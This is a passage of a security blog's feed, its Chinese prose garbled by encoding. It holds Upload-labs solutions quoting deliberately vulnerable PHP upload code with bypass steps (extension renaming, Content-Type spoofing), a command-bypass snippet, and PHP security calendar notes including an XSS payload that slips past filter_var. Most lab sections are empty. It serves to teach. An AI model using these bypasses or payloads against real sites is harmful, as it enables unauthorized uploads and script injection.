class="comment"># cat&lt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Upload-labsè§£é¢˜ç¬”è®°</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/Upload-labs%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/Upload-labsè§£é¢˜ç¬”è®°/</id>
    <published>2019-11-27T11:56:44.000Z</published>
    <updated>2019-11-27T11:58:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>upload-labsè§£é¢˜è®°å½•</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿™é‡Œåªæ˜¯è¿›è¡Œäº†å‰ç«¯çš„æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªåç¼€åä¸ºgifçš„æ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…ï¼Œåœ¨burpä¸­æŠŠgifæ”¹æˆphpï¼Œç„¶åå°±å¯ä»¥ç›´æ¥ç»•è¿‡äº†</p><p><img src="http://images.xianyu123.club/up_pass1_1.png" alt></p><p><img src="http://images.xianyu123.club/up_pass1_2.png" alt></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œåªæ˜¯æ£€æµ‹äº†http headerå­—æ®µä¸­çš„<code>Content-Type</code>å­—æ®µï¼Œå¹¶æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥ä¸Šä¼ åç¼€åä¸ºphpçš„æ–‡ä»¶å³å¯</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>.asp,.aspx,.php,.jsp</code>åç¼€çš„æ–‡ä»¶</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;upload-labsè§£é¢˜è®°å½•&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°/</id>
    <published>2019-11-27T11:56:14.000Z</published>
    <updated>2019-11-30T07:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°</p><a id="more"></a><h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">        <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åœ¨ç¬¬12è¡Œä»£ç ä¸­ï¼Œå› ä¸ºin_arrayæ²¡æœ‰è®¾ç½®<code>strict</code>æ¯”è¾ƒï¼Œåˆ™é»˜è®¤ä½¿ç”¨å®½æ¾æ¯”è¾ƒï¼Œå…·ä½“å¯å‚è€ƒ<a href="https://www.php.net/manual/zh/function.in-array.php" target="_blank" rel="noopener">å®˜æ–¹æ‰‹å†Œ</a>,æ‰€ä»¥è™½ç„¶è®¾ç½®äº†ç™½åå•ï¼Œä½†è¿˜æ˜¯å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">$file_name = <span class="string">'1a.php'</span>;</span><br><span class="line">var_dump(in_array($file_name, $whitelist));</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœ</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">      <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">      <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">'index.html'</span>,</span><br><span class="line">      [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´-1"><a href="#æ¼æ´-1" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>xss</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¬¬10è¡Œä»£ç ç»è¿‡æ¸²æŸ“ä¹‹åå¯ä»¥é˜²æ­¢è¢«æ ‡ç­¾é—­åˆï¼Œç¬¬22è¡Œ<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>æ˜¯éªŒè¯urlçš„å‡½æ•°ï¼Œåªéœ€è¦æ„é€ <code>a://b</code>å³å¯ï¼Œç„¶ååœ¨<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>é‡Œé¢å¯ä»¥ç”¨<code>javascript:</code>ä¼ªåè®®è¿›è¡Œjsä»£ç çš„æ‰§è¡Œï¼Œå‚è€ƒ<a href="https://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">Aæ ‡ç­¾ä½¿ç”¨javascript:ä¼ªåè®®</a>ã€‚å› ä¸ºnextSlideæ˜¯é€šè¿‡GETè¯·æ±‚æ¥æ”¶çš„ï¼Œé‚£ä¹ˆæ„é€ <code>javascript://123%0aalert(1)</code>ï¼Œè¿™é‡Œçš„<code>//</code>å¯¹äº<code>filter_var</code>å‡½æ•°æ¥è¯´æ˜¯åè®®ï¼Œä½†æ˜¯å¯¹äºjsæ¥è¯´æ˜¯æ³¨é‡Šï¼Œè¿™æ ·å¯ä»¥å·§å¦™çš„ç»•è¿‡<code>filter_var</code>å‡½æ•°å¹¶ä¸”æˆåŠŸæ‰§è¡Œjsä»£ç ã€‚å› ä¸º<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>é‡Œé¢è·³è½¬çš„é“¾æ¥æ˜¯è·³è½¬åˆ°æµè§ˆå™¨ï¼Œæ‰€ä»¥å¯¹<code>%0a</code>å†æ¬¡è¿›è¡Œurlç¼–ç ï¼Œæ‰€ä»¥æ„é€ <code>javascript://123%250aalert(1)</code></p><h3 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">  $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">  $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $template;</span><br><span class="line">  <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´-2"><a href="#æ¼æ´-2" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°&lt;/p&gt;
    
    </summary>
    
